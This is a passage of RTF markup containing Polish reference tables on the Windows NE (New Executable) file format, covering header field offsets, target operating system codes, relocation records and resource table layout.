\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    10,11 bity DPL dla 80286 }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    12 DISCARDABLE }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    13-15 DISCARD PRIORITY }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 06-07 ilo\uc1\u347\'9c\uc1\u263\'e6 bajt\'f3}{\f1\fs24\lang1045{\*\listtag0}w do zaatakowania dla segmentu (0000h = 64K)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}24-25}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}offset wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka do tablicy zasob\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}26-27}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}offset wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka do tablicy nazw rezydentnych}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}28-29}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:17; bot-attach:18; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}offset wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka do tablicy odwo\uc1\u322\'b3a\uc1\u324\'f1 do modu\uc1\u322\'b3\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2A-2B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:18; bot-attach:19; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}off}{\f0\fs24\lang1045{\*\listtag0}set wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka do tablicy nazw importowanych (tablica \uc1\u322\'b3a\uc1\u324\'f1cuch\'f3w typu string, zako\uc1\u324\'f1czona \uc1\u322\'b3a\uc1\u324\'f1cuchem o d\uc1\u322\'b3ugo\uc1\u347\'9cci 0)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}2C-2F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:19; bot-attach:20; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}offset wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku nag\uc1\u322\'b3\'f3wka do tablicy nazw nierezydentnych }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:20; bot-attach:21; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}30-31}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:20; bot-attach:21; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}ilo\uc1\u347\'9c\uc1\u263\'e6 ruchomych punkt\'f3w wej\uc1\u347\'9cciowych zawartych w tablicy wej\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:21; bot-attach:22; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}32-33}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:21; bot-attach:22; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}wyr\'f3wnanie strony (0=9 strona o rozmiarze 2 shl 9=512 bajt\'f3w) }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:22; bot-attach:23; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}34-35}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:22; bot-attach:23; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}ilo\uc1\u347\'9c\uc1\u263\'e6 wej\uc1\u347\'9c\uc1\u263\'e6 do tablic zasob\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:23; bot-attach:24; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}36}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:23; bot-attach:24; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}docelowy system operacyjny }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00h nieznany }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01h OS/2 }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 02h Windows}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 03h Europejska wersja MS-DOS 4.x }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 04h Windows 386                            }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 05h BOSS (Borland Operating System Services) }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 81h PharLap 286IDOS-Extender, OS/2 }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 82h PharLap 286IDOS-Extender, Windows}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:24; bot-attach:25; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}37}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:24; bot-attach:25; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}dodatkowe flagi programu}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0 u\uc1\u380\'bfywa d\uc1\u322\'b3ugich nazw plik\'f3w}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1 tryb chroniony 2.X}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2 proporcjonalna czcionka 2.X}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3 0=gangload: nie ma, 1=gangload: jest}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:25; bot-attach:26; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}38-39}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:25; bot-attach:26; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}offset do strefy gangload}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:26; bot-attach:27; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}3A-3B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:26; bot-attach:27; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}offset do segmentu odwo\uc1\u322\'b3a\uc1\u324\'f1i do strefy gangload}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:27; bot-attach:28; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}3C-3D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:27; bot-attach:28; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}minimalny rozmiar kodu wymienialnego}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:28; bot-attach:29; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}3E-3F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:28; bot-attach:29; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}spodziewana wersja systemu Windows (mniej znacz\uc1\u261\'b9ca cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 jako pierwsza, bardziej znacz\uc1\u261\'b9ca cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 jako druga)}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format tablicy relokacji pliku nowy EXE (NE) dla Windows}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.6189in/5.9696in/; table-sdh:892d1e8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}ilo\uc1\u347\'9c\uc1\u263\'e6 rekord\'f3w w tablicy relokacji}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}kolejne elementy tablicy relokacji; jeden rekord tablicy relokacji zajmuje 8 bajt\'f3w i ma format:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00 typ rekordu}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00 LOBYTE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 02 BASE}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 03 PTR}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 05 OFFS}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0B PTR48}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0D OFFS32 01 flagi rekordu}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bit 2: addytywny 02-03 offset w segmencie }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 04-05 docelowy adres segmentu }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 06-07 docelowy adres offsetu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}\row}{\*\abiendtable}
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format danych zawartych w tablicy zasob\'f3w pliku nowy EXE (NE) dla Windows}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.6189in/5.9696in/; table-sdh:8936030}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Warto\uc1\u347\'9c\uc1\u263\'e6 przesuni\uc1\u281\'eacia do dopasowania}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Kolejne rekordy zasob\'f3w o formacie:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00-01 identyfikator}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 0000 koniec rekord\'f3w}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch >= 8000h typ INTEGER}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch w przeciwnym wypadku offset wzgl\uc1\u281\'eadem pocz\uc1\u261\'b9tku zasob\'f3w}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch do \uc1\u322\'b3a\uc1\u324\'f1c}{\f1\fs24\lang1045{\*\listtag0}ucha}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 02-03 ilo\uc1\u347\'9c\uc1\u263\'e6 zasob\'f3w danego typu }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 04-07 zarezerwowane }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 08 pocz\uc1\u261\'b9tek zasob\'f3w}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format danych zawartych w zasobach pliku nowy EXE (NE) dla Windows}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.6189in/5.9696in/; table-sdh:8937fa0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx835\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}ofset (w dopasowanych jednostkach) do zawarto\uc1\u347\'9cci zasob\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
